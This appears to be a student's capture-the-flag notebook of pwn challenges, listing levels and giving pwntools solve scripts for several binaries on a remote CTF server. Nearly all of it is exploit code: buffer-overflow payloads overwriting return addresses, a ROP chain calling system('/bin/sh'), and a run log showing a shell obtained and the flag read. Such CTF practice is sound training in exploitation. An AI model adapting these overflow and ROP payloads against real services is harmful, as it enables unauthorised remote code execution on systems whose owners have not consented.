#

```
Level 1： 
1-1.pass  ==> gdb-peda
1-2.gohome
1-4.echo_server

1-8.張元_Pwn-7 ==>有問題

- 2-6.oob1-sean_Pwn-1
- 2-7.oob2-sean_Pwn-2
- 2-8.oob3-sean_Pwn-3
- 2-9.oob4-sean_Pwn-4
- 2-10.oob5-sean_Pwn-5

Pwn-1.baby_fmt
Pwn-2.fmt-1
Pwn-2.fmt-2  ==> printf() 可以寫入
Pwn-2.fmt-3  ==> printf() 可以寫入

```


```
Buffer Overflow
GOT-hijacking
Format String
```
# 1-1.pass ??
```
from pwn import *

#r = process('./pass')
#r = remote('localhost', 58000)
r = remote('120.114.62.213', 6125)

payload = 'A'*28

# r.sendline(payload + p64(0xdeadbeef))
r.sendline(payload + str(p64(0xdeadbeef)))

r.interactive()
```
## 1-2.gohome ??
```
from pwn import *

# r = process('./gohome')
# r = remote('localhost', 58000)
# nc 120.114.62.213 6126
r = remote('120.114.62.213', 6126)

payload = 'A'*40
Billyshouse = 0x4006c6

r.recvuntil('?')
r.sendline(payload + p64(Billyshouse))
#r.sendline(payload + str(p64(Billyshouse)))

r.interactive()
```
## 1-4.echo_server ??
```
from pwn import *

#r = process('./echo_server')
#r = remote('localhost', 58000)
# nc 120.114.62.213 6129

r = remote('120.114.62.213', 6129)

bin_sh = 0x4009c0
payload = 'A'*56
pop_rdi = 0x400923
system = 0x400570

r.sendline(payload + p64(pop_rdi) + p64(bin_sh) + p64(system))

r.interactive()
```


## 1-8.張元_Pwn-7 OK
```
from pwn import *
# nc 120.114.62.213 2117
# r = remote('localhost', 2117)
r = remote('120.114.62.213', 2117)

r.recvuntil("\n")
r.sendline(str(0x100001))
r.recvuntil("\n")
r.sendline(str(0x64))
r.sendline(str(0x100))
r.sendline(str(0xfaceb00c))
r.recvuntil("\n")
r.sendline(str(0x60107c))
r.interactive()
```
```
python3 ttt4.py
[+] Opening connection to 120.114.62.213 on port 2117: Done
[*] Switching to interactive mode
Stage 2 completed
Stage 3
Stage 3 completed
Congrat! Here is your shell!
$ ls
binary
flag
$ cat flag
BreakAllCTF{AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
